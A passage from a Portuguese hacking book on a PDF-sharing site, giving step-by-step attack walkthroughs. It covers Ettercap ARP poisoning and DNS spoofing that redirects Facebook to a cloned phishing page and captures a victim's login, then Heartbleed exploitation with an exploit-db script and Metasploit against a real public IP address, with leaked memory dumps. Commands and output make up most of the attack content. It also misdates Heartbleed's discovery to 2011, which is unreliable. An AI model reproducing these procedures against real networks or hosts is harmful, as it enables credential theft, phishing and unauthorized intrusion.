Tráfego - DNS Spoofing<br /> <br /> 1.3.<br /> <br /> Ettercap - Man In The Middle<br /> <br /> O Ettercap é uma ferramenta de segurança de rede livre e de código aberto para ataques man-in-themiddle na LAN. Ele pode ser usado para análise de protocolo de rede de computador e auditoria de segurança. 310<br /> <br /> Ele é executado em vários sistemas operacionais como o Unix, incluindo Linux, Mac OS X, BSD e Solaris, e no Microsoft Windows. Ele é capaz de interceptar tráfego em um segmento de rede, capturar senhas e realizar escuta ativa contra vários protocolos comuns. Ele funciona colocando a interface de rede em modo promíscuo com a ARP envenenando as máquinas de destino. Assim, pode agir como um 'man in the middle' e desencadear vários ataques a uma ou mais vítimas. Ettercap tem suporte de plugin para que os recursos possam ser estendidos adicionando novos plugins. Utilizando o Ettercap O ettercap faz parte da suíte de programas do Kali Linux. Realizando o redirecionamento de pacotes Abra o terminal e digite o comando abaixo no Kali Linux para que ele permita o redirecionamento de tráfego dos pacotes: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="d6a4b9b9a296bdb7babf">[email&#160;protected]</a>:~# echo “1” > /proc/sys/net/ipv4/ip_forward Configurando o ettercap Vamos editar o arquivo de configuração do ettercap: /etc/ettercap/etter.conf Os parâmetros de algumas sessões devem ser alterados. Na sessão [privs] vamos realizar algumas alterações: 311<br /> <br /> [privs] ec_uid = 0 ec_gid = 0<br /> <br /> # nobody is the default # nobody is the default<br /> <br /> Por padrão ele está configurado com um número de portas, então vamos mudar para 0, pois iremos indicar as portas em outro arquivo. Na sessão Linux vamos descomentar algumas regras: #--------------# Linux #--------------# if you use ipchains: #redir_command_on = "ipchains -A input -i %iface -p tcp -s 0/0 -d 0/0 %port -j REDIRECT %rport" #redir_command_off = "ipchains -D input -i %iface -p tcp -s 0/0 -d 0/0 %port -j REDIRECT %rport" # if you use iptables: redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport" redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport" As regras são específicas para iptables, e elas irão habilitar o redirecionamento dos comandos do iptables de acordo com a configuração que iremos fazer. Editaremos o arquivo de configuração de DNS, onde iremos inserir os DNS alvos. /etc/ettercap/etter.dns Vamos alterar os dados de registros desse arquivo, como no exemplo abaixo: 312<br /> <br /> ################################ # microsoft sucks ;) # redirect it to www.linux.org # facebook.com A 192.168.0.28 *.facebook.com A 192.168.0.28 *.facebook.* A 192.168.0.28 www.facebook.com PTR 192.168.0.28 #microsoft.com A 107.170.40.56 #*.microsoft.com A 107.170.40.56 #www.microsoft.com PTR 107.170.40.56 # Wildcards in PTR are not allowed ##########################################<br /> <br /> Observações: (01) Neste ataque iremos apenas utilizar o registro tipo A, porém é possível utilizar todos os tipos de registro que o atacante deseja atacar. (02) DNS<br /> <br /> Veja a lista na página X de Tipos de Registro de<br /> <br /> Agora, vamos clonar a página alvo através da opção de engenharia social do setoolkit. Verifique Sessão “Criando uma armadilha - setoolkit” Realizando o ataque - ettercap Vamos agora iniciar o sniffing com o ettercap. Abra o terminal e digite: 313<br /> <br /> <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="087a67677c4863696461">[email&#160;protected]</a>:~# ettercap -T -q -M arp -i eth0 -P dns_spoof // 192.168.0.1// //192.168.0.26// ettercap 0.8.2 copyright 2001-2015 Ettercap Development Team Listening on: eth0 -> 08:00:27:2D:3D:79 192.168.0.28/255.255.255.0 fe80::a00:27ff:fe2d:3d79/64 Ettercap might not work correctly. /proc/sys/net/ipv6/conf/eth0/ use_tempaddr is not set to 0. Privileges dropped to EUID 0 EGID 0... 33 plugins 42 protocol dissectors 57 ports monitored 20388 mac vendor ﬁngerprint 1766 tcp OS ﬁngerprint 2182 known services Lua: no scripts were speciﬁed, not starting up! Scanning for merged targets (2 hosts)... * |=======================================>| 100.00 % 3 hosts added to the hosts list... ARP poisoning victims: GROUP 1 : 192.168.0.1 50:6A:03:48:30:4F GROUP 2 : 192.168.0.26 08:00:27:38:88:EE Starting Uniﬁed snifﬁng... Text only Interface activated... Hit 'h' for inline help 314<br /> <br /> Activating dns_spoof plugin... ettercap : Executa a aplicação ettercap. -T: Ativa o modo console texto. -q: Ativa o modo promiscuo na interface de rede. -M: Ativa o tipo de ataque MITM para o modo ARP. -i: Seleciona a interface que será utilizada para o ataque. -P: Indica qual plugin do ettercap que será utilizado no caso o dns_spoof. //192.168.0.1// : indica o IP do alvo no caso o gateway. //192.168.0.26// : indica o IP da vítima. Com este comando estamos utilizando o ettercap no modo texto, ativando o ataque “man in the middle” na interface de rede eth0 do Kali Linux, utilizando o plugin de falsificação de DNS, configurando o Kali para funcionar como o gateway para a vítima com o IP 192.168.0.28.<br /> <br /> Observação para as opções: /// : Realiza spoofing em toda a rede. //IP//: Realiza o ataque em um IP específico. Realizando o envenenamento do ARP Iremos realizar o redirecionamento dos pacotes da máquina da vítima (192.168.0.26) para o roteador através da interface do atacante. <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="d2a0bdbda692b9b3bebb">[email&#160;protected]</a>:~# arpspoof -i eth0 -t 192.168.0.26 -r 192.168.0.1 8:0:27:2d:3d:79 8:0:27:38:88:ee 0806 42: arp reply 192.168.0.1 is-at 8:0:27:2d:3d:79 315<br /> <br /> 8:0:27:2d:3d:79 50:6a:3:48:30:4f 0806 42: arp reply 192.168.0.26 is-at 8:0:27:2d:3d:79 A g o ra , s e m p r e q u e a v í t i m a a c e s s a r o s i t e www.facebook.com ele será redirecionado para a página fake do facebook, na máquina do atacante que foi clonada através do setoolkit. Observe que, na tela do comando ettercap, surgirão entradas de acesso da vítima ao facebook. Activating dns_spoof plugin... dns_spoof: A [www.facebook.com] spoofed to [192.168.0.28] dns_spoof: A [facebook.com] spoofed to [192.168.0.28] dns_spoof: A [pt-br.facebook.com] spoofed to [192.168.0.28] dns_spoof: A [login.facebook.com] spoofed to [192.168.0.28] Quando a vítima inserir o login e senha de acesso a página, ele irá retornar para a página inicial de login e os dados que a vítima inseriu serão armazenados pelo setoolkit. Analisando os dados As credenciais podem ser verificadas na tela do setoolkit ou no arquivo no diretório /var/www/ html que o setoolkit gerou. Veja onde encontrar as credenciais na tela do setoolkit: ('Array\n',) ('(\n',) (' [lsd] => AVpRwLpv\n',)<br /> <br /> 316<br /> <br /> (' [display] => \n',) (' [enable_proﬁle_selector] => \n',) (' [isprivate] => \n',) (' [legacy_return] => 0\n',) (' [proﬁle_selector_ids] => \n',) (' [return_session] => \n',) (' [skip_api_login] => \n',) (' [signed_next] => \n',) (' [trynum] => 1\n',) (' [timezone] => \n',) (' [lgndim] => \n',) (' [lgnrnd] => 171016_mbG0\n',) (' [lgnjs] => n\n',) (' [email] => <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="fd899592908d8e9293bd9a909c9491d39e9290">[email&#160;protected]</a>\n',) (' [pass] => senha321\n',) (' [login] => 1\n',) (')\n',) Fonte: Videoaula TDI – Ataques na Rede – Ettercap – Man in the middle<br /> <br /> 2.<br /> <br /> Heartbleed<br /> <br /> O Heartbleed é um bug na biblioteca de software de criptografia open-source OpenSSL, que permite a um atacante ler a memória de um servidor ou de um cliente, permitindo a este recuperar chaves SSL privadas do servidor. Os logs que foram examinados até agora levam a crer que alguns hackers podem ter explorado a falha de segurança pelo menos cinco meses antes da falha ser descoberta por equipes de segurança em meados de 2011. Muitas aplicações de correções já foram atualizadas. Esse tipo de exploração não é tão efetivo atualmente. Ve r s õ e s d e S O e a p l i c a ç õ e s v u l n e r á v e i s a o Heartbleed: 317<br /> <br /> OpenSSL version 1.0.1 Android versão 4.1.1 Apache 2.2.22<br /> <br /> 2.1.<br /> <br /> Verificando com script [exploit-db]<br /> <br /> Existem vários scripts para facilitar a operação do atacante, verifique uma página de um script em Python que realize esta verificação: https://www.exploit-db.com/exploits/32764/ Realize o download do script, abra o terminal do Kali Linux, navegue até o diretório onde foi realizado o download e digite o comando: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="097b66667d4962686560">[email&#160;protected]</a>:~# python 32764.py 193.248.250.121 Trying SSL 3.0... Connecting... Sending Client Hello... Waiting for Server Hello... ... received message: type = 22, ver = 0300, length = 86 ... received message: type = 22, ver = 0300, length = 1291 ... received message: type = 22, ver = 0300, length = 4 Sending heartbeat request... ... received message: type = 24, ver = 0300, length = 16384 Received heartbeat response: 0000: 02 40 00 D8 03 00 53 43 5B 90 9D 9B 72 0B BC 0C <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="86a8c6a8a8a8a8d5c5">[email&#160;protected]</a>[...r... 0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90 . +..H...9....... 0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0 .w.3....f.....". 0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00 !. 9.8.........5. 318<br /> <br /> 0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0 ................ 0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00 ............3.2. 0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00 ....E.D...../... 0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00 A............... … WARNING: server returned more data than it should server is vulnerable! python: executa a aplicação python. 32764.py: script baixado do site exploit-db. -p 443: Indica a porta a ser analisada, no caso a porta 443. Observe que no site analisado foi encontrada a vulnerabilidade e ele apresentou os dados em cache. 2.2.<br /> <br /> Verificando através de ferramentas online<br /> <br /> Existem algumas ferramentas online que realizam esta verificação e trazem um relatório para o atacante. FILIPPO<br /> <br /> LastPass<br /> <br /> https://filippo.io/Heartbleed/<br /> <br /> https://lastpass.com/heartbleed/<br /> <br /> Para utilizar essas ferramentas online é bem simples: digite o IP ou site do alvo e clique no botão para iniciar. 319<br /> <br /> 2.3.<br /> <br /> Verificando com o NMAP<br /> <br /> O nmap faz o uso do script ssl-heartbleed.nse para realizar um scan em busca desta vulnerabilidade. Vamos realizar a verificação em um servidor vulnerável para termos noção do retorno do comando. Abra um terminal no Kali Linux e digite: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="a6d4c9c9d2e6cdc7cacf">[email&#160;protected]</a>:~# nmap -sV -p 443 -script=ssl-heartbleed 193.248.250.121 Starting Nmap 7.01 (https://nmap.org) at 2017-05-24 08:19 BST Nmap scan report for LAubervilliers-656-1-105-121.w193-248.abo.wanadoo.fr (193.248.250.121) Host is up (0.046s latency). PORT STATE SERVICE VERSION 443/tcp open ssl/http-proxy SonicWALL SSL-VPN http proxy |_http-server-header: SonicWALL SSL-VPN Web Server | ssl-heartbleed: | VULNERABLE: | The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption. | State: VULNERABLE | Risk factor: High | OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted conﬁdential information as well as the encryption keys themselves. 320<br /> <br /> | | References: | https://cve.mitre.org/cgi-bin/cvename.cgi? name=CVE-2014-0160 | http://www.openssl.org/news/secadv_20140407.txt |_ http://cvedetails.com/cve/2014-0160/ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 14.30 seconds 2.4.<br /> <br /> Explorando a vulnerabilidade<br /> <br /> Vamos utilizar o msfconsole para encontrar a vulnerabilidade. Para a sua utilização é necessário iniciar o serviço de banco de dados SLQ: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="3644595942765d575a5f">[email&#160;protected]</a>:~# service postgresql start Após isso, é necessário iniciar o banco de dados msfdb, o banco de dados do Metasploit [msfconsole]: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="23514c4c576348424f4a">[email&#160;protected]</a>:~# msfdb init A database appears to be already conﬁgured, skipping initialization Agora vamos iniciar o terminal do Metasploitable msfconsole: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="34465b5b40745f55585d">[email&#160;protected]</a>:~# msfconsole<br /> <br /> … Save 45% of your time on large engagements with Metasploit Pro Learn more on http://rapid7.com/metasploit =[ metasploit v4.14.1-dev<br /> <br /> ] 321<br /> <br /> + =[ 1628 exploits - 927 auxiliary - 282 post ] + =[ 472 payloads - 39 encoders - 9 nops ] + =[ Free Metasploit Pro trial: http://r-7.co/trymsp ] msf > Vamos realizar a busca pelo exploit heartbleed no banco de dados: msf > search heartbleed Matching Modules ================ Name Disclosure Date Rank Description --------------- -------------auxiliary/scanner/ssl/openssl_heartbleed 2014-04-07 normal OpenSSL Heartbeat (Heartbleed) Information Leak auxiliary/server/openssl_heartbeat_client_memory 2014-04-07 normal OpenSSL Heartbeat (Heartbleed) Client Memory Exposure msf > Observe que foram encontradas duas formas para explorar esta vulnerabilidade. Vamos utilizar o exploit openssl_heartbleed: msf > use auxiliary/scanner/ssl/openssl_heartbleed msf auxiliary(openssl_heartbleed) > Digite ‘show options’ para verificar as informações de parâmetros de uso deste exploit. msf auxiliary(openssl_heartbleed) > show options Module options (auxiliary/scanner/ssl/openssl_heartbleed): 322<br /> <br /> Name Current Setting Required Description ------------------ -------- -DUMPFILTER no Pattern to ﬁlter leaked memory before storing MAX_KEYTRIES 50 yes Max tries to dump key RESPONSE_TIMEOUT 10 yes Number of seconds to wait for a server response RHOSTS yes The target address range or CIDR identiﬁer RPORT 443 yes The target port (TCP) STATUS_EVERY 5 yes How many retries until status THREADS 1 yes The number of concurrent threads TLS_CALLBACK None yes Protocol to use, "None" to use raw TLS sockets (Accepted: None, SMTP, IMAP, JABBER, POP3, FTP, POSTGRES) TLS_VERSION 1.0 yes TLS/SSL version to use (Accepted: SSLv3, 1.0, 1.1, 1.2) Auxiliary action: Name Description ---- ----------SCAN Check hosts for vulnerability msf auxiliary(openssl_heartbleed) > Vamos indicar o IP da vítima: msf auxiliary(openssl_heartbleed) > set rhosts 193.248.250.121 rhosts => 193.248.250.121 Vamos configurar para mostrar as etapas do processo na tela: 323<br /> <br /> msf auxiliary(openssl_heartbleed) > set verbose true verbose => true Não é necessário alterar as outras opções dos parâmetros, pois a configuração padrão basta para este ataque, principalmente o parâmetro da porta 443. Agora vamos iniciar a exploração: msf auxiliary(openssl_heartbleed) > exploit [*] 193.248.250.121:443 - Sending Client Hello... [*] 193.248.250.121:443 - SSL record #1: [*] 193.248.250.121:443 Type: 22 [*] 193.248.250.121:443 Version: 0x0301 [*] 193.248.250.121:443 Length: 86 [*] 193.248.250.121:443 Handshake #1: [*] 193.248.250.121:443 Length: 82 [*] 193.248.250.121:443 Type: Server Hello (2) [*] 193.248.250.121:443 Server Hello Version: 0x0301 [*] 193.248.250.121:443 Server Hello random data: 59251d98407cc1b2235db02d6ba5104347804c935c851bc6d2c449b 45c9a9e79 [*] 193.248.250.121:443 Server Hello Session ID length: 32 [*] 193.248.250.121:443 Server Hello Session ID: 12c61a1c3c93da7083152f6e825221da8f8d5b117af94a9a9ac9b5b3c 7bc0b0c [*] 193.248.250.121:443 - SSL record #2: [*] 193.248.250.121:443 Type: 22 [*] 193.248.250.121:443 Version: 0x0301 [*] 193.248.250.121:443 Length: 1291 [*] 193.248.250.121:443 Handshake #1: [*] 193.248.250.121:443 Length: 1287 [*] 193.248.250.121:443 Type: Certiﬁcate Data (11) [*] 193.248.250.121:443 Certiﬁcates length: 1284 [*] 193.248.250.121:443 Data length: 1287<br /> <br /> 324<br /> <br /> [*] 193.248.250.121:443 Certiﬁcate #1: [*] 193.248.250.121:443 Certiﬁcate #1: Length: 1281 [*] 193.248.250.121:443 Certiﬁcate #1: # [*] 193.248.250.121:443 - SSL record #3: [*] 193.248.250.121:443 Type: 22 [*] 193.248.250.121:443 Version: 0x0301 [*] 193.248.250.121:443 Length: 4 [*] 193.248.250.121:443 Handshake #1: [*] 193.248.250.121:443 Length: 0 [*] 193.248.250.121:443 Type: Server Hello Done (14) [*] 193.248.250.121:443 - Sending Heartbeat... [*] 193.248.250.121:443 - Heartbeat response, 65535 bytes [+] 193.248.250.121:443 - Heartbeat response with leak [*] 193.248.250.121:443 - Printable info leaked: ......Y$...`!.{.8...:.L.(...}!..,XF.....f.....".!. 9.8.........5.............................3.2.....E.D...../...A.........$Vf.9...3. [0t.w.&..........H.=...i..ue.w....W.. [.F._.^<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="ddf3f3f3a9f387f384f385f3f3f3f3f38af3a3f389f38ef3f3f38ff38cf393f3f3f390f391f3f3f396f3aef394f398f399f39cf3f3f39df3">[email&#160;protected]</a>;.:. 6...5.4.a...*...).(.'.&.}.#.\.j.............9.}.E..... .)...........`. 0.......V.............................e.....M...t...W.....!.....%.y.c.x... .f...d...`<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="ddf39df3f3f3a4f3">[email&#160;protected]</a> 1...".l.r.......I... 8.6...................................................................................... repeated 16122 times ...................................aD....'...............0...0..........! @.......EOd.S-.0...*.H........0A1.0...U....FR1.0...U....GANDI SAS1.0...U....Gandi Standard SSL CA0...131002000000Z.. 171002235959Z0b1!0...U....Domain Control Validated1.0...U....Gandi Standard SSL1 0...U....intranet.mast-boyer.com0.."0...*.H............. 0...........w.>....+..acJ....M...`..>.p....\.....[..9...MO.|..e.. [.s9i..,<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="80e6aed9aed1b5aee7aeaec0c5f5aec9aeaeaed4aeaecc">[email&#160;protected]</a>^.....hw."..........}..k-4.ujc.....]).....U. 9.....k.u..U.....q..g. ..0m.N.........t..._A.Qls..zs...x.5K4....J=+.Emua... 9.%.ye.4..zQ...]<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="153b3b3b5c653b403b3b3b6f3b3b793b3b3b642c3b557c3b647d3b3b3b3b3b3b573b3b3b3b3b3b3b3b3b3b3b3b253b3b3b253b3b3b403b">[email&#160;protected]</a>#.. 0......../...K.h..P.1.y!0...U.........:'.VQ-.ypj!.2....0...U...........0...U.......<br /> <br /> 325<br /> <br /> 0.0...U.%..0...+.........+.......0`..U. .Y0W0K..+.....1....0</p>
</div>
</div>
</div>
<div class="modal fade" id="report" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog">
<div class="modal-content">
<form role="form" method="post" action="https://pdfcoffee.com/report/livro-tecnicas-de-invasaopdf-pdf-free">
<div class="modal-header">
<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
<h4 class="modal-title">Report "Livro-Tecnicas-De-Invasao.pdf"</h4>
</div>
<div class="modal-body">
<div class="form-group">
<label>Your name</label>
<input type="text" name="name" required="required" class="form-control border" />
</div>
<div class="form-group">
<label>Email</label>
<input type="email" name="email" required="required" class="form-control border" />
</div>
<div class="form-group">
<label>Reason</label>
<select name="reason" required="required" class="form-control border">
<option value="">-Select Reason-</option>
<option value="pornographic" selected="selected">Pornographic</option>
<option value="defamatory">Defamatory</option>
<option value="illegal">Illegal/Unlawful</option>
<option value="spam">Spam</option>
<option value="others">Other Terms Of Service Violation</option>
<option value="copyright">File a copyright complaint</option>
</select>
</div>
<div class="form-group">
<label>Description</label>
<textarea name="description" required="required" rows="3" class="form-control border"></textarea>
</div>
<div class="form-group">
<div class="d-inline-block">
<div class="g-recaptcha" data-sitekey="6Le_trkUAAAAAEg6edIIuGuFzUY3ruFn6NY9LK-S"></div>
</div>
</div>
<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src='https://www.google.com/recaptcha/api.js'></script>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-danger" data-dismiss="modal">Close</button>
<button type="submit" class="btn btn-info">Submit</button>
</div>
</form>
</div>
</div>
</div>
<script>
    $(document).ready(function () {
        var inner_height = $(window).innerHeight() - 260;
        $('#pdfviewer').css({"height": inner_height + "px"});
    });
</script>
<div class="container-fluid my-3">

<footer id="footer" class="row">
<div id="footer-top" class="col-12">
<div class="row">
<div class="col-md-4 col-12">
<a href="https://pdfcoffee.com/">
<img src="https://pdfcoffee.com/pdfcoffee/assets/img/pdfcoffee_logo.png" class="mh-logo" alt="pdfcoffee.com" />
</a>
<br><br>
<p></p>
<hr />
<h3>Contact information</h3>
<p>
<strong>Ronald F. Clayton</strong><br />
<i class="fa fa-envelope-o"></i> <a href="/cdn-cgi/l/email-protection#f39a9d959cb3839795909c95959696dd909c9e" title="send an email to info@pdfcoffee.com"><span class="__cf_email__" data-cfemail="ef86818980af9f8b898c8089898a8ac18c8082">[email&#160;protected]</span></a><br /><br />
<span><i class="fa fa-map-marker"></i> Address: </span>
<address>46748 Colby MotorwayHettingermouth, QC T3J 3P0</address>
</p>
</div>
<div class="col-md-4 col-12">
<ul class="footer-links">
<li><a href="https://pdfcoffee.com/about">About Us</a></li>
<li><a href="https://pdfcoffee.com/contact">Contact Us</a></li>
<li><a href="https://pdfcoffee.com/copyright">Copyright</a></li>
<li><a href="https://pdfcoffee.com/privacy">Privacy Policy</a></li>
<li><a href="https://pdfcoffee.com/term">Terms and Conditions</a></li>
<li><a href="https://pdfcoffee.com/faq">FAQ</a></li>
<li><a href="https://pdfcoffee.com/cookie_policy">Cookie Policy</a></li>
</ul>
</div>

<div class="col-md-4 col-12">
<form action="https://pdfcoffee.com/newsletter" method="post">
<div id="newsletter" class="w-100">
<h2 class="section-title">Subscribe our weekly<br><span>Newsletter</span></h2>
<div class="input-group">
<input type="text" placeholder="Enter your E-mail" name="newsletter_email" id="newsletter_email" class="form-control" />
<span class="input-group-btn">
<button class="btn btn-danger" type="submit">Subscribe</button>
</span>
</div>
</div>
</form>
</div>

</div>
</div>

<div id="copyright" class="col-12 my-3 px-3">
Copyright © 2021 PDFCOFFEE.COM. All rights reserved.

<ul class="social-networks">
<li><a href="#"><i class="fa fa-facebook"></i></a></li>
<li><a href="#"><i class="fa fa-twitter"></i></a></li>
<li><a href="#"><i class="fa fa-pinterest"></i></a></li>
<li><a href="#"><i class="fa fa-youtube"></i></a></li>
<li><a href="#"><i class="fa fa-rss"></i></a></li>
</ul>

</div>

</footer>

</div>

<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script async src="https://www.googletagmanager.com/gtag/js?id=UA-148594354-1"></script>
<script>
	      window.dataLayer = window.dataLayer || [];
	      function gtag(){dataLayer.push(arguments);}
	      gtag('js', new Date());

	      gtag('config', 'UA-148594354-1');
	    </script>

<div id="PDFCOFFEECOM_cookie_box" style="z-index:99999; border-top: 1px solid #fefefe; background: #FFC107; width: 100%; position: fixed; padding: 5px 15px; text-align: center; left:0; bottom: 0;">
Our partners will collect data and use cookies for ad personalization and measurement. <a href="https://pdfcoffee.com/cookie_policy" target="_blank">Learn how we and our ad partner Google, collect and use data</a>. <a href="#" class="btn btn-success" onclick="accept_PDFCOFFEECOM_cookie_box();return false;"><em><i class="fa fa-close"></i></em> Agree & close</a>
</div>
<script>
	    function accept_PDFCOFFEECOM_cookie_box() {
		document.cookie = "PDFCOFFEECOM_cookie_box_viewed=1;max-age=15768000;path=/";
		hide_PDFCOFFEECOM_cookie_box();
	    }

	    function hide_PDFCOFFEECOM_cookie_box() {
		var cb = document.getElementById('PDFCOFFEECOM_cookie_box');
		if (cb) {
		    cb.parentElement.removeChild(cb);
		}
	    }

	    (function () {
		var PDFCOFFEECOM_cookie_box_viewed = (function (name) {
		    var matches = document.cookie.match(new RegExp("(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"));
		    return matches ? decodeURIComponent(matches[1]) : undefined;
		})('PDFCOFFEECOM_cookie_box_viewed');

		if (PDFCOFFEECOM_cookie_box_viewed) {
		    hide_PDFCOFFEECOM_cookie_box();
		}
	    })();
	</script>

</body>
</html>
